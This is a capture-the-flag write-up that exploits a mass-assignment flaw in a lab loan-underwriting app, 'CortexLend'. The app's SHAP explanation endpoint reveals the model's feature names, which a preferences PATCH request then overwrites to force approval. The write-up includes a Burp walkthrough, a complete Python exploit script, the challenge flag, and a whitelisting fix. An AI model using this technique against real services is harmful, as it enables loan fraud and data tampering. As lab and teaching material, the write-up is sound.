# TokenCity: The Loan Arranger - CTF Writeup

## Challenge Overview
**Mission Briefing:**
"EPOCH-1, we are receiving anomalous approval signals from the Kepler-7 cargo hub. Loan applications for autonomous freight units are being approved that should never clear underwriting. Someone, or something, is manipulating the credit pipeline. If rogue freighters start jumping without authorisation, Oracle 9 gets its backdoor into the fleet. Lock it down." — TryHaulMe Fleet Command

**Objective:**
Access the CortexLend platform, identify the vulnerability in the ML pipeline, and demonstrate the exploit before Oracle 9 does. Proof of concept is a successful fraudulent approval. 

## 1. Initial Reconnaissance & Enumeration

The target is the **CortexLend** web application running on `http://10.48.151.59/`. 

By interacting with the application and capturing the traffic (via proxy history), the following core functionalities and API endpoints were discovered:

- **Authentication:**
  - `POST /auth/register` - Registers a new user.
  - `POST /auth/login` - Authenticates a user and returns a JWT session cookie.
- **Loan Processing:**
  - `POST /api/loan/apply` - Submits a loan application for the logged-in user.
  - `GET /api/loan/explain` - Explains the reasoning behind the loan decision using Machine Learning interpretability.
- **User Profile:**
  - `PATCH /api/profile/preferences` - Updates user interface and notification preferences.

## 2. Analyzing the ML Pipeline

Upon registering a standard user account and applying for a loan via `POST /api/loan/apply`, the application predictably denies the loan request.

```json
// Response from /api/loan/apply
{
  "message": "Your application did not meet our current lending criteria.",
  "score": 0.225,
  "status": "denied"
}
```

The interesting part of this challenge lies in the **AI explainability endpoint** (`GET /api/loan/explain`). CortexLend uses a Machine Learning model (GradientBoostingClassifier) to underwrite loans. To comply with regulatory standards (e.g., Fair Lending Act, EU AI Act), it exposes how the model evaluates an applicant.

Requesting an explanation returns the user's hidden feature values and their SHAP (SHapley Additive exPlanations) impacts:

```json
// Response from /api/loan/explain
{
  "confidence": 0.225,
  "current_values": {
    "credit_duii": 612.0,
    "debt_to_income": 0.35,
    "loan_default_flag": 0.0,
    "months_employed": 18.0,
    "num_late_payments": 1.0
  },
  "explainer": {
    "method": "SHAP TreeExplainer",
    "model_type": "GradientBoostingClassifier"
  },
  "feature_impacts": {
    "credit_duii": -0.076,
    "debt_to_income": 0.0,
    "loan_default_flag": -0.0,
    "months_employed": -0.015,
    "num_late_payments": -0.04
  },
  "prediction": "denied",
  "primary_factor": {
    "feature": "credit_duii",
    "impact": -0.076,
    "recommendation": "Improving 'credit_duii' would most significantly affect your approval odds."
  }
}
```

This output exposes the exact variable names the ML model uses:
- `credit_duii`
- `debt_to_income`
- `loan_default_flag`
- `months_employed`
- `num_late_payments`

## 3. Vulnerability Discovery: Feature Store Namespace Collision (Mass Assignment)

While normal users cannot directly modify these ML feature variables through the frontend, the application provides an endpoint to update profile preferences (`PATCH /api/profile/preferences`).

Normally, a request to this endpoint looks like this:
```json
{
  "notification_freq": "daily",
  "theme": "dark",
  "timezone": "America/Denver"
}
```

The vulnerability lies in how the backend processes this input. It suffers from a **Mass Assignment / Namespace Collision** flaw. The application blindly takes the keys from the JSON payload and writes them into the user's data store—the same data store that the ML feature extraction pipeline queries when evaluating a loan application. 

By injecting the exact feature variables discovered in step 2 into the preferences payload, we can manipulate our hidden ML features.

## 4. Manual Exploitation (Burp Suite Walkthrough)

A human penetration tester would perform the following steps to exploit this manually:

1.  **Intercept Preferences Update:** In Burp Suite, capture a `PATCH` request to `/api/profile/preferences` (e.g., by changing the "theme" in the UI).
2.  **Repeater Injection:** Send this request to **Repeater**.
3.  **Craft Malicious Payload:** Modify the JSON body to include the ML feature variables discovered from the `/api/loan/explain` endpoint. Set them to values that would guarantee approval.
    ```json
    {
      "notification_freq": "daily",
      "theme": "dark",
      "timezone": "America/Denver",
      "credit_duii": 800,
      "months_employed": 120,
      "num_late_payments": 0,
      "debt_to_income": 0.1
    }
    ```
4.  **Send Request:** Click **Send** in Repeater. The server confirms the fields are updated.
5.  **Trigger Loan Approval:** Go back to the browser or use Repeater to send a `POST` request to `/api/loan/apply`. The backend ML model pulls the poisoned data, and the flag is returned in the response.

### Endpoint Role Breakdown:
- **`/api/profile/preferences` (The Vulnerability):** This is where the malicious payload is sent. It is vulnerable to Mass Assignment, allowing you to overwrite internal variables (ML features) by including them in the JSON body.
- **`/api/loan/apply` (The Trigger):** No exploit payload is sent here. You send a standard request to this endpoint *after* the poisoning. It acts as the "consumer" of the poisoned data, triggering the logic that leads to the flag.

## 5. Automated Exploit Script

The following Python script automates the entire process:

```python
import requests
import random

base_url = "http://10.48.151.59"
session = requests.Session()

def exploit():
    # 1. Create a random user
    username = f"rogue_freighter_{random.randint(1000,9999)}"
    password = "password123"
    
    print(f"[*] Registering user: {username}")
    session.post(f"{base_url}/auth/register", json={"username": username, "password": password})
    session.post(f"{base_url}/auth/login", json={"username": username, "password": password})

    # 2. Check baseline (denial)
    print("[*] Initial Loan Application...")
    res = session.post(f"{base_url}/api/loan/apply")
    print(f"    Status: {res.json().get('status')} - Score: {res.json().get('score')}")

    # 3. Exploit Namespace Collision
    print("[*] Injecting manipulated ML features via preferences endpoint...")
    malicious_payload = {
        "notification_freq": "daily",
        "theme": "dark",
        "timezone": "America/Denver",
        "credit_duii": 800,           # Maximize credit score
        "months_employed": 120,       # Long employment history
        "num_late_payments": 0,       # Flawless payment history
        "debt_to_income": 0.1         # Low debt-to-income ratio
    }
    session.patch(f"{base_url}/api/profile/preferences", json=malicious_payload)

    # 4. Profit
    print("[*] Re-applying for Loan...")
    res = session.post(f"{base_url}/api/loan/apply")
    data = res.json()
    
    print(f"\n[+] Success! Status: {data.get('status')} - Score: {data.get('score')}")
    print(f"[+] Message: {data.get('message')}")

if __name__ == "__main__":
    exploit()
```

## Conclusion & Mitigation
The challenge highlights the risks of **Mass Assignment vulnerabilities** in the context of Machine Learning applications. Because the user preference object and the ML feature store shared the same namespace without strict input sanitization/whitelisting, user-controlled input polluted the ML pipeline.

**Fix:** Ensure backend endpoints strictly whitelist the parameters users are allowed to update. Never accept arbitrary keys in JSON bodies to update user objects, especially when those objects are shared with backend predictive models.

**Flag:** `THM{f34tur3_st0r3_n4m3sp4c3_c0ll1s10n}`